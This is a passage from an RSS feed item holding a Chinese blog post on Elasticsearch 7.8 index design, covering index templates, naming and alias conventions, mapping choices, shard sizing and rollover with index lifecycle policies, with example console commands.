    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index_patterns&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: [
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index-*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    ],
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;settings&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number_of_replicas&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;1&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;max_result_window&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;100000&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;refresh_interval&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;30s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;10s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;5s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.query.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;500ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;800ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;500ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.search.slowlog.threshold.fetch.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;200ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.warn&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;10s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;5s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.debug&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.indexing.slowlog.threshold.index.trace&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;500ms&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        },
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mappings&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;dynamic&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
        }
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;priority&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;10&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这样新建index-开头的索引的时候都会默认配置好如上的配置，这样就是考虑到基本设置公共化&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;2.2、索引命名规范&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　这部分主要说下索引命名规范，包括别名，通过别名可以使得索引的操作变得更加灵活，一个索引可以有多个别名，当然一个别名可以配置多个索引，这样的话就极大的增加了索引的的灵活性。在索引的命名上规定特殊字段开头，同样对其好进行权限控制，关于权限控制可以参考：&lt;a class=&quot;postTitle2 vertical-middle&quot; href=&quot;https://www.cnblogs.com/zsql/p/14373370.html&quot;&gt;elasticsearch7.8权限控制和规划&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;必须严格按照如下命名格式：（否则将无法使用，因为这里设置了相关权限）；&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;&lt;strong&gt;索引命名规范：index-{行业}-{业务}-{版本}&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;别名命名规范：&lt;/strong&gt;index&lt;/span&gt;-{行业}-{业务}&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt; &lt;/strong&gt;如果是索引拆分后（有多个索引），需要一个全局的读的别名对所有拆分后的所有进行命名，和一个最新索引写的别名（只对可更新的索引），如果这里没有描述清楚，请见&lt;strong&gt;2.5大索引的设计&lt;/strong&gt;，两个别名可规范如下：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;读别名：index-{行业}-{业务}-read&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;写别名：index-{行业}-{业务}-insert&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;2.3、mapping的设计&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;mapping设置主要就是怎么选择数据类型，分词等&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;中文分词：推荐使用：&quot;analyzer&quot;: &quot;ik_max_word&quot; ，这样可以更细粒度的进行中文分词&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;设置字段的时候，务必过一下如下图示的流程。根据实际业务需要，主要关注点：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;数据类型选型；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;是否需要检索；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;是否需要排序+聚合分析；&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;是否需要另行存储&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219223103209-1834910904.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt;核心参数的含义，梳理如下&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219223221700-1168895403.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt; 2.4、分片的设计&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;这个很重要，直接影响到后期的管理和性能。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Elasticsearch中的数据组织成索引。每一个索引由一个或多个分片组成。每个分片是Luncene索引的一个实例，你可以把实例理解成自管理的搜索引擎，用于在Elasticsearch集群中对一部分数据进行索引和处理查询。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;分片设计原则&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;推荐每个分片的大小：20-40G，建议不超过30G，但是也会有特殊的情况，有些索引字段少，但是数据量大，这样的话也可以增加一些分片数&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;确保每个节点的分片数量保持在低于每1GB堆内存对应集群的分片在20-25之间。 因此，具有30GB堆内存的节点最多可以有600-750个分片&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;每个索引的分片：一般为节点数的1-3倍，假设我们有15个数据节点，则15*3*40G=1.8T，这样一个索引最多设置真的大，如果超过了，就需要参考大索引的设计&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;分片数量尽量为数据节点的倍数，这样就可以使得数据进来均衡，但是数据量极少的索引，根据情况进行分片数量的设计&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;下面写一个简单的参考表（都可以根据实际情况进行调整，只是个人的建议）：&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;索引的大小&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;分片数量设置&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;0-20G&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;2&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;20-100G&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;8&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;100-400G&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;15&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;400-900G&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;30&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;900G-1.6T&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;45&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;如上设置是基于15个数据节点进行配置的，基本都给增量预留了一些空间，最好是根据实际情况进行设定，如果一个索引已经很大了，上面的配置不能满足了的话需要对对索引进行拆分了，使用索引模板+Rollover+索引生命周期进行自动滚动，拆分索引。见2.5节&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;2.5、大索引的设计&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;　　当一个索引太大时就会有很多的风险，首先会影响性能，当分片数一定的情况下，数据越来越多，一个分片就会越来越大，就会违背了上面的设计原则，其次就是一个索引出问题，很难恢复，并且影响范围广，那如何对很大的索引进行设计呢。可以使用索引模板+Rollover+生命周期进行自动滚动创建索引，所有的索引都用一个别名进行读，并且设置一个索引为写，这样就能够很好的拆分索引。先看看这么设计的原理图。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219200026641-415484295.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 上面有三个索引，通过index_all索引进行检索，是用index_latest保证只写入到一个最新的索引中，每次索引满足三个条件（文档数，时间，索引大小）中的一个，就会自动的滚动生成新的索引。接下来做个实操，这样更方面理解。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;先来个官网，有兴趣的可以参考：&lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/7.8/getting-started-index-lifecycle-management.html&quot;&gt;https://www.elastic.co/guide/en/elasticsearch/reference/7.8/getting-started-index-lifecycle-management.html&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;主要分为四个步骤：&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;创建索引生命周期的规则&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;创建索引模板并应用该生命周期&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;初始化一个索引&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;验证&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span&gt;首先创建生命周期的规则，对于索引的生命周期可以参考：&lt;a class=&quot;entrylistItemTitle&quot; href=&quot;https://www.cnblogs.com/zsql/p/13745772.html&quot;&gt;对Elasticsearch生命周期的思考&lt;/a&gt;，如果数据是定期存储的，比如一些日志，只保留最近30天，这样的数据结合索引的生命周期可以自动的进行清理。我们首先创建一个策略policy_index，这里是测试，所以把时间调至5分钟，这些配置都应该根据实际情况进行设置。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;PUT _ilm/policy/&lt;span&gt;policy_index
{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;policy&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;phases&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hot&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {                      
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;actions&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
          &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rollover&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;max_size&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;50GB&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,     
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;max_age&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;5m&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
          }
        }
      }
    }
  }
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219201234350-1524851462.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  接下来设计索引模板，并且该策略应用进去。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;PUT _index_template/&lt;span&gt;policy_index_template
{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index_patterns&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: [
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index-test-*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
  ],
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;settings&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number_of_shards&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;1&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number_of_replicas&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;1&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.lifecycle.name&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;policy_index&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, #配置策略
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index.lifecycle.rollover_alias&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index-test-insert&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;aliases&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;index-test-read&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;is_write_index&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;false  #这个别名是用来读的，不允许写，否则会和写的那个别名冲突&lt;/span&gt;&lt;span&gt;
      }
    }
  }
}&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这里的模板只是为了演示该小节的内容，实际情况应该把基本配置以及mapping相关的设置好&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219202829658-1871482316.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    接下来就是创建一个索引了&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;PUT index-test-&lt;span&gt;000001&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219220625171-1429096502.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 创建好之后，然后给索引添加别名index-test-insert，索引就自动有了两个别名，read负责读，insert负责写&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219203409849-48337463.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 接下来，只要通过验证即可：GET index-*/_ilm/explain&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219203723974-1073357600.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 最后达到条件后就会自动生成新的索引，然后把index-test-insert别名切换到新的索引上面，就是这样子的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1271254/202102/1271254-20210219220444705-1128030808.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; 大索引的设计就是拆分，很多都是根据时间进行切分索引的，如果记得没错的话，上面的000001这些可以配置为日期的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考博文：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KQQJfKCOuqadTujbLNu5aA&quot;&gt;https://mp.weixin.qq.com/s/KQQJfKCOuqadTujbLNu5aA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI2NDY1MTA3OQ%3D%3D&amp;amp;chksm=eaa8291cdddfa00ae765d5fc5298e252a0f848197348123266afb84751d9fe8907aff65d7aea&amp;amp;idx=1&amp;amp;mid=2247483700&amp;amp;scene=21&amp;amp;sn=1549fc794f77da2d2194c991e1ce029b&quot;&gt;https://mp.weixin.qq.com/s?__biz=MzI2NDY1MTA3OQ%3D%3D&amp;amp;chksm=eaa8291cdddfa00ae765d5fc5298e252a0f848197348123266afb84751d9fe8907aff65d7aea&amp;amp;idx=1&amp;amp;mid=2247483700&amp;amp;scene=21&amp;amp;sn=1549fc794f77da2d2194c991e1ce029b&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 19 Feb 2021 14:42:00 +0000</pubDate>
<dc:creator>一寸HUI</dc:creator>
<og:description>本文为博客园作者所写：&amp;#160;一寸HUI，个人博客地址：https://www.cnblogs.com/zsql/ 最近在做es相关的工作，所以记录下自己的一些想法，可能很多方面不会很全面，但是基</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zsql/p/14418018.html</dc:identifier>
</item>
</channel>
</rss>